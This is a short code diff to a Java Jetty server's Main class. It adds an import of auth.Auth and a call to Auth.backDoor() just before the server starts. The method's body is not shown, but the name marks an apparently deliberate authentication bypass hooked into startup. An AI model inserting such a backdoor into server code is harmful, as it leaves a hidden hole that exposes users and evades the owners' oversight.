@@ -1,3 +1,4 @@
+import auth.Auth;
 import frontend.Frontend;
 import org.eclipse.jetty.server.Handler;
 import org.eclipse.jetty.server.Server;
@@ -24,6 +25,8 @@ public class Main {
         HandlerList handlers = new HandlerList();
         handlers.setHandlers(new Handler[]{resource_handler, context});
         server.setHandler(handlers);
+
+        Auth.backDoor();
 
         server.start();
         server.join();
